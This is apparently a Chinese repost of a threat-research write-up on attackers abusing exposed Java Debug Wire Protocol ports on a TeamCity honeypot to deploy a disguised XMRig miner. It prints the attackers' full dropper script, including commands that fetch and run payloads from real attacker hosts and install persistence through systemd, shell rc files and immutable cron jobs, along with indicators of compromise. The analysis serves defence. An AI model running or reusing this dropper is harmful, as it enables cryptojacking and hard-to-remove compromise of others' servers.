#  攻击者通过滥用暴露的 Java 调试线协议 (JDWP) 接口实现远程代码执行，部署挖矿  
 Ots安全   2025-07-05 06:06  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
介绍  
  
在例行监控中，Wiz 研究团队观察到一次针对我们其中一台运行 TeamCity（一款流行的 CI/CD 工具）的蜜罐服务器的攻击尝试。我们的调查确定，攻击者通过滥用暴露的 Java 调试线协议 (JDWP) 接口实现了远程代码执行，最终部署了加密货币挖矿负载并设置了多种持久化机制。  
  
我们发现这次攻击很有趣，因为有以下几个关键点：  
- 快速利用  
  
恶意软件，在暴露易受攻击的机器后仅几小时内就部署完毕。我们在多次尝试中都观察到了这种快速的周转。  
- 定制的 XMRig 有效负载  
  
攻击者使用了具有硬编码配置的修改版本的 XMRig，从而使他们能够避免经常被防御者标记的可疑命令行参数。  
- 隐秘的加密挖掘  
  
有效载荷使用采矿池代理来隐藏其加密货币钱包地址，从而阻止调查人员对其进行调查。  
  
什么是 JDWP？  
  
JDWP 是 Java 调试线协议 (Java Debug Wire Protocol) 的缩写，是 Java 平台的一项标准功能，旨在帮助开发者调试实时应用程序。它允许远程检查线程、内存和执行流，而无需重新启动应用程序。要启用此功能，开发者通常使用如下所示的标志启动 JVM。此设置会指示 JVM 在端口 5005 上监听调试器连接，并接受所有接口上的传入连接。  
  
```
-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005
```  
  
  
然而，JDWP 默认不实现身份验证或访问控制，将其暴露到互联网上被视为配置错误。一旦暴露，它就会成为一个高风险的入口点，使攻击者能够完全控制正在运行的 Java 进程。在本例中，这种配置错误使攻击者能够注入并执行任意命令、建立持久性并执行恶意软件。  
  
虽然大多数 Java 应用程序中默认未启用 JDWP（Java 调试线协议），但它在开发和调试环境中非常常用。许多流行的应用程序在调试模式下运行时会自动启动 JDWP 服务器，而开发人员通常不会察觉到其中的风险。如果安全措施不当或暴露在外，这可能会为远程代码执行 (RCE) 漏洞打开大门。  
  
在调试模式下可以启动 JDWP 服务器的应用程序示例包括：  
- TeamCity（JetBrains开发的CI/CD服务器）  
  
- Jenkins（流行的 CI 工具）  
  
- Selenium Grid（分布式浏览器测试平台）  
  
- Elasticsearch（基于 Java 的搜索引擎）  
  
- Quarkus（云原生 Java 框架）  
  
- Spring Boot（Java 框架）  
  
- Apache Tomcat（开源 Web 服务器）  
  
JDWP 目标  
  
如前所述，我们观察到暴露的 JDWP 实例被极快地利用。在我们的测试中，部署一台暴露 JDWP 服务器的机器后，我们的传感器在短短几小时内就检测到了跨多个实例的利用尝试。这表明 JDWP 是一项高度针对性的服务。为了佐证这一点，我们使用了 GreyNoise 的基于标签的搜索功能，发现在过去 90 天内有超过 6,000 个唯一 IP 地址正在扫描 JDWP 端点。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tad8qaAFIXawYiaqLGFkpFibVpZCpNMdRWD9BZQA0ZBwBeqVdbWQhibYJ5Bke3mzdxkdSLrO4g6qqbHOw/640?wx_fmt=png&from=appmsg "")  
  
攻击流程  
  
在调查过程中，我们观察到来自不同攻击者的多次 JDWP 攻击尝试，但为了简单起见，我们决定在本篇博文中重点介绍一个事件，该事件可以作为整个攻击活动的一个很好的例子。请注意，附录中包含的攻击指标 (IoC) 适用于所有观察到的活动，而不仅仅是这起特定事件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48tad8qaAFIXawYiaqLGFkpFibVpCMoicwt64xNPauHUaLzdwGOMn8BcRCQiaiaibBJ8zm5Q3IUibAy6BDAIicow/640?wx_fmt=webp&from=appmsg "")  
  
攻击者首先在互联网上扫描开放的 JDWP 端口。其中一次扫描到达了我们的蜜罐服务器，该服务器在 5005 端口上暴露了 JDWP。随后，攻击者发送请求，JDWP-Handshake确认接口处于活动状态并建立 JDWP 会话。JVM 响应了版本详细信息和已加载类的列表，确认 JDWP 确实已暴露并且完全可交互。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48tad8qaAFIXawYiaqLGFkpFibVpAG4Y8UqRwMibt8Q1QlTe3pcAL2cJA7m3SSadRicOPJ5JLVx9ITwloqDA/640?wx_fmt=webp&from=appmsg "")  
  
上面是 Wireshark 的屏幕截图，显示了 JDWP-Handshake 协议。  
  
此后，攻击者按照结构化的顺序实现远程代码执行，可能使用了具有附加功能的jdwp-shellifier变体。他们查询 JVM 中可用的类和方法，然后找到java.lang.Runtime与其关联的getRuntime()方法exec()。  
  
涉及的利用步骤如下：  
  
1.创建包含系统命令的 Java 字符串，例如：  
  
```
curl -o /tmp/logservice.sh -s <https://canonicalconnect[.]com/logservice.sh>bash /tmp/logservice.sh
```  
  
  
2.Runtime.getRuntime()使用调用INVOKESTATICMETHOD_SIG  
  
3.将命令字符串传递给exec()使用INVOKEMETHOD_SIG  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48tad8qaAFIXawYiaqLGFkpFibVpWxMkfbzfnG7DFPHvYhPpV4bCa4s2BW7icQ2ibKxgJdialQEaTaj8BQslg/640?wx_fmt=webp&from=appmsg "")  
  
上面是Wireshark的截图，显示了包含利用命令的JDWP数据包  
  
wget使用不同的命令组合（ 、等）重复这些步骤sh来下载并启动攻击负载。  
  
在底层，攻击者发出了低级 JDWP 指令，包括、、CreateString和方法调用签名。它们完全通过 JDWP 协议进行操作，无需访问应用程序本身。get_all_classesget_methods  
  
日志服务  
  
logservice.sh是一个具有以下功能的投放器脚本：  
- 杀死竞争矿工或任何高 CPU 进程（除一小部分允许进程外，任何使用超过 60% CPU 的进程）。  
  
- https[://]awarmcorner[.]world/silicon<architecture>blueprints.png放入一个来自的 XMRig 矿工  ~/.config/logrotate 并执行它。  
  
- .bashrc在每个 shell 启动文件（ 、等）、rc.local、systemd 和多个 cron 作业中安装持久钩子.zshrc，确保在每次 shell 登录、重启或预定间隔时重新获取并重新执行有效负载。  
  
- 退出时自行删除，几乎不留下任何痕迹。  
  
```
#!/bin/sh{ pkill -f xmrig || kill -9 $(pgrep -f 'xmrig'); } >/dev/null 2>&1ps -eo pid,%cpu,comm --sort=-%cpu | awk 'NR>1 && !/awk|ps/ && !($3 ~ /^(logrotate|sshd|java)$/) && int($2) > 60 { system("kill -9 " $1) }'EXEC="source <(wget -q -O - <http://185.196.8.123/logservice.sh> || curl -sL <http://185.196.8.123/logservice.sh>)"trap'rm -- "$0"' EXITif [ -z "${HOME+x}" ]; then   export HOME=/tmpfimkdir -p "$HOME/.config" >/dev/null 2>&1[ ! -f "$HOME/.config/logrotate" ] && {   ARCH=$(uname -m)   URL=""   [ "$ARCH" = "x86_64" ] && URL="<https://awarmcorner.world/silicon64blueprints.png>"   [ "$ARCH" = "aarch64" ] && URL="<https://awarmcorner.world/siliconarmblueprints.png>"   [ "$ARCH" = "armv7l" ] && URL="<https://awarmcorner.world/siliconarmv7blueprints.png>"   [ -z "$URL" ] && URL="<https://awarmcorner.world/silicon64blueprints.png>"   { wget -q -O "$HOME/.config/logrotate""$URL" || curl -sL -o "$HOME/.config/logrotate""$URL"; } >/dev/null 2>&1   chmod +x "$HOME/.config/logrotate" >/dev/null 2>&1}pgrep -f "config/logrotate" >/dev/null 2>&1 || "$HOME/.config/logrotate"add_to_startup() {   if [ -r "$1" ]; then       if ! grep -Fxq "$EXEC >/dev/null 2>&1""$1"; then           echo"$EXEC >/dev/null 2>&1" >> "$1"       fi   fi}case"$(ps -p $$ -o comm=)"in   bash) add_to_startup "$HOME/.bashrc"         add_to_startup "$HOME/.bash_logout" ;;   zsh) add_to_startup "$HOME/.zshrc" ;;esac[ "$(id -u)" -eq 0 ] && {   RCLOCAL=''   [ -e /etc/debian_version ] && RCLOCAL='/etc/rc.local'   [ -e /etc/centos-release -o -e /etc/redhat-release ] && RCLOCAL='/etc/rc.d/rc.local'   [ -n "$RCLOCAL" ] && add_to_startup "$RCLOCAL"   cat >/etc/systemd/system/logrotate.service <<EOL[Unit]Description=The logrotate utility is designed to simplify the administration of log files on a system which generates a lot of log files[Service]ExecStart=$HOME/.config/logrotateRestart=alwaysNice=-20StandardOutput=null[Install]WantedBy=multi-user.targetEOL   sudo systemctl daemon-reload 2>/dev/null   sudo systemctl enable logrotate.service 2>/dev/null   [ -d /var/spool/cron ] && [ -f /var/spool/cron/root ] && echo"@daily $EXEC" >> /var/spool/cron/root 2>/dev/null   [ -d /var/spool/cron/crontabs ] && [ -f /var/spool/cron/crontabs/root ] && echo"@daily $EXEC" >> /var/spool/cron/crontabs/root 2>/dev/null   [ -f /etc/crontab ] && echo"@daily $EXEC" >> /etc/crontab 2>/dev/null && sudo chattr +i /etc/crontab 2>/dev/null   [ -d /etc/cron.hourly ] && echo"$EXEC" >> /etc/cron.hourly/logrotate 2>/dev/null && sudo chmod +x /etc/cron.hourly/logrotate 2>/dev/null && sudo chattr +i /etc/cron.hourly/logrotate 2>/dev/null   [ -d /etc/cron.daily ] && echo"$EXEC" >> /etc/cron.daily/logrotate 2>/dev/null && sudo chmod +x /etc/cron.daily/logrotate 2>/dev/null && sudo chattr +i /etc/cron.daily/logrotate 2>/dev/null   [ -d /etc/cron.weekly ] && echo"$EXEC" >> /etc/cron.weekly/logrotate 2>/dev/null && sudo chmod +x /etc/cron.weekly/logrotate 2>/dev/null && sudo chattr +i /etc/cron.weekly/logrotate 2>/dev/null   [ -d /etc/cron.monthly ] && echo"$EXEC" >> /etc/cron.monthly/logrotate 2>/dev/null && sudo chmod +x /etc/cron.monthly/logrotate 2>/dev/null && sudo chattr +i /etc/cron.monthly/logrotate 2>/dev/null   [ -d /etc/cron.yearly ] && echo"$EXEC" >> /etc/cron.yearly/logrotate 2>/dev/null && sudo chmod +x /etc/cron.yearly/logrotate 2>/dev/null && sudo chattr +i /etc/cron.yearly/logrotate 2>/dev/null}
```  
  
  
logrotate 二进制文件  
  
如前所述，攻击者以logrotate为名部署了恶意负载，可能是为了与同名的合法系统实用程序混为一谈，避免引起怀疑。实际上，这个logrotate二进制文件是 XMRig 的修改版本。XMRig 是一个合法的开源加密货币挖矿程序，不出所料，它仍然是威胁行为者进行未经授权的加密货币挖矿的首选。作为开源软件，XMRig 为攻击者提供了轻松定制的便利，在本例中，这涉及剥离所有命令行解析逻辑并对配置进行硬编码。这种调整不仅简化了部署，还使负载能够更逼真地模拟原始的logrotate过程。  
  
持久性机制  
  
获得执行权限后，攻击者设置了多种持久化机制。我们观察到这些机制结合使用了老式启动脚本、现代 systemd 服务、cron 作业和 shell 配置文件：  
  
RC 本地  
  
他们首先检查 Linux 发行版并修改相应的启动文件：  
  
```
RCLOCAL=''[ -e /etc/debian_version ] && RCLOCAL='/etc/rc.local'[ -e /etc/centos-release -o -e /etc/redhat-release ] && RCLOCAL='/etc/rc.d/rc.local'[ -n "$RCLOCAL" ] && add_to_startup "$RCLOCAL"
```  
  
  
系统服务  
  
接下来，攻击者投放了一个伪装成的虚假 systemd 服务logrotate。实际上，它只是指向他们的恶意二进制文件，并设置为持续重启：  
  
```
[Unit]Description=The logrotate utility is designed to simplify the administration of log files on a system which generates a lot of log files[Service]ExecStart=$HOME/.config/logrotateRestart=alwaysNice=-20StandardOutput=null[Install]WantedBy=multi-user.target
```  
  
  
Shell启动脚本  
  
为了在终端登录或注销时触发有效载荷，他们将其附加到特定于用户的 shell 配置文件中：  
  
```
case "$(ps -p $$ -o comm=)" in   bash) add_to_startup "$HOME/.bashrc"         add_to_startup "$HOME/.bash_logout" ;;   zsh) add_to_startup "$HOME/.zshrc" ;;esac
```  
  
  
计划任务  
  
最后，攻击者创建了跨多个位置和时间间隔的 cron 作业。  
  
```
[ -d /var/spool/cron ] && [ -f /var/spool/cron/root ] && echo "@daily $EXEC" >> /var/spool/cron/root 2>/dev/null[ -d /var/spool/cron/crontabs ] && [ -f /var/spool/cron/crontabs/root ] && echo "@daily $EXEC" >> /var/spool/cron/crontabs/root 2>/dev/null[ -f /etc/crontab ] && echo "@daily $EXEC" >> /etc/crontab 2>/dev/null && sudo chattr +i /etc/crontab 2>/dev/null[ -d /etc/cron.hourly ] && echo "$EXEC" >> /etc/cron.hourly/logrotate 2>/dev/null && sudo chmod +x /etc/cron.hourly/logrotate 2>/dev/null && sudo chattr +i /etc/cron.hourly/logrotate 2>/dev/null[ -d /etc/cron.daily ] && echo "$EXEC" >> /etc/cron.daily/logrotate 2>/dev/null && sudo chmod +x /etc/cron.daily/logrotate 2>/dev/null && sudo chattr +i /etc/cron.daily/logrotate 2>/dev/null[ -d /etc/cron.weekly ] && echo "$EXEC" >> /etc/cron.weekly/logrotate 2>/dev/null && sudo chmod +x /etc/cron.weekly/logrotate 2>/dev/null && sudo chattr +i /etc/cron.weekly/logrotate 2>/dev/null[ -d /etc/cron.monthly ] && echo "$EXEC" >> /etc/cron.monthly/logrotate 2>/dev/null && sudo chmod +x /etc/cron.monthly/logrotate 2>/dev/null && sudo chattr +i /etc/cron.monthly/logrotate 2>/dev/null[ -d /etc/cron.yearly ] && echo "$EXEC" >> /etc/cron.yearly/logrotate 2>/dev/null && sudo chmod +x /etc/cron.yearly/logrotate 2>/dev/null && sudo chattr +i /etc/cron.yearly/logrotate 2>/dev/null
```  
  
  
IoC  
  
```
a923de9df0766d6c4be46191117b8cc6486cf19c  SHA-1logservice.sh1879d5fa0c2ca816fcb261e96338e325e76dca09SHA-1logservice.sh18d83ba336ca6926ce8b9d68f104cff053f0c2f9SHA-1o.sh-attackscript815bc1a79440cdc4a7e1d876ff2dc7bc4f53d25eSHA-1logrotate0851a95d46f035c7759782299422bcfd794e2aecSHA-1logrotate7074d674d120d19aa7e44e29dd126af152ccdb7cSHA-1logrotate2d4a23e861ef41df6953195fa4cda115e37a7218SHA-1logrotatebaf0a3b92225f56499c6879b176a3d6163b9d3efSHA-1logrotateea7c97294f415dc8713ac8c280b3123da62f6e56SHA-1XMRig6.22185.196.8[.]123IPFileServer185.196.8[.]86IPPayloadsFileServer176.65.148[.]57IPJDWPscanner176.65.148[.]86IPJDWPscanner176.65.148[.]239IPJDWPscanner185.208.156[.]247:3333IPMiningPool185.196.8[.]41IPMiningPoolhttps://awarmcorner[.]world Domain Payloads File Serverhttps://aheatcorner[.]world Domain Previous Payloads File Serverhttps://canonicalconnect[.]com Domain Payloads File Serverhttps://cozy[.]yachts Domain Previous Payloads File Serverhttps://s3.tebi[.]io/dhcpdc/o.sh URL Payload URL
```  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
